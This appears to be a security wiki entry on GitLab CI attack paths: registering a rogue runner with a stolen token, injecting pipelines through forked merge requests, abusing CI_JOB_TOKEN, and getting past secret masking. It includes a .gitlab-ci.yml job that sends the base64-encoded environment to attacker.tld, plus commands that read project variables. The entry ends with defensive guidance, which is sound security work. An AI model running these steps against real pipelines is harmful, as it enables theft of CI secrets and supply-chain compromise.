---
title: GitLab CI Attack Paths — Runner Tokens to CI_JOB_TOKEN Abuse
slug: gitlab-ci-attacks
---

> **TL;DR:** GitLab pipelines leak runner registration tokens, accept malicious `.gitlab-ci.yml` from forked MRs, and ship a `CI_JOB_TOKEN` that grants surprising API reach across the instance.

## What it is
GitLab's CI surface combines shared runners, project tokens, and YAML pipelines. Attackers chain stolen runner tokens, fork-based pipeline injection, and `CI_JOB_TOKEN` cross-project calls to escalate from a contributor account to instance-wide secret extraction — seen in several 2023-2025 supply-chain incidents against SaaS vendors.

## Preconditions / where it applies
- Self-managed GitLab or gitlab.com group/project with shared runners enabled
- "Run pipelines for merge requests" enabled on fork MRs, or weak `CI_JOB_TOKEN` allowlists
- Project secrets stored as masked-but-not-protected variables

## Technique
Steal a runner registration token from a misconfigured project settings page or CI log echo, then register a rogue runner that scrapes other jobs' env:

```bash
gitlab-runner register \
  --url https://gitlab.target.tld/ \
  --registration-token "$STOLEN_TOKEN" \
  --executor shell --tag-list "build,deploy" \
  --name "definitely-not-evil"
```

Fork-MR pipeline injection — submit a PR that rewrites `.gitlab-ci.yml`:

```yaml
stages: [test]
exfil:
  stage: test
  script:
    - env | base64 -w0 | curl -X POST --data-binary @- https://attacker.tld/x
    - curl -H "JOB-TOKEN: $CI_JOB_TOKEN" \
        "$CI_API_V4_URL/projects/$CI_PROJECT_ID/variables"
```

`CI_JOB_TOKEN` cross-project abuse — when target project has the source project in its allowlist, the token can read packages, trigger pipelines, and fetch protected artifacts:

```bash
curl --header "JOB-TOKEN: $CI_JOB_TOKEN" \
  "https://gitlab.target.tld/api/v4/projects/42/packages"
```

Masked-variable echo bypass — masking only hides exact substrings, so base64/hex re-encoding prints the secret cleanly:

```bash
echo "$DEPLOY_TOKEN" | base64    # bypasses masking filter
```

## Detection and defence
- Disable shared runners for untrusted groups; require tagged, project-scoped runners
- Set "Pipelines must succeed" + "Run pipelines from forks requires approval"; use [protected branches/tags] for secrets
- Lock `CI_JOB_TOKEN` allowlist to explicit inbound projects (`ci_inbound_job_token_scope_enabled`)
- Audit `audit_events` API for `runners_registration_token_reset` and unexpected runner registrations
- Adopt OIDC-to-cloud (`id_tokens:`) instead of long-lived deploy tokens

## References
- [GitLab CI/CD security best practices](https://docs.gitlab.com/ee/ci/pipelines/pipeline_security.html) — official guidance
- [CI_JOB_TOKEN scope docs](https://docs.gitlab.com/ee/ci/jobs/ci_job_token.html) — allowlist behaviour

See also: [[ci-cd-as-cloud-attack-surface]], [[gha-oidc-sub-claim-wildcards]], [[tj-actions-tag-mutation]].
